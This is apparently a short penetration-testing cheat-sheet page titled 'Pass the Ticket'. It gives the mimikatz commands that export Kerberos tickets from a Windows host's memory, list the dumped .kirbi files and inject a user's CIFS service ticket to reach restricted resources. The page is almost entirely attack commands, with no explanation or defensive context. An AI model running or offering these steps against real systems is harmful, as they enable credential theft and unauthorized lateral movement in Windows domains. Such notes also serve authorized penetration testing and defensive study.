# Pass the Ticket

{% code title="mimikatz #" %}
```
privilege::debug
sekurlsa::tickets /export
```
{% endcode %}

```
dir *.kirbi
```

{% code title="mimikatz # " %}
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
{% endcode %}

We should now have access to whatever was restricted
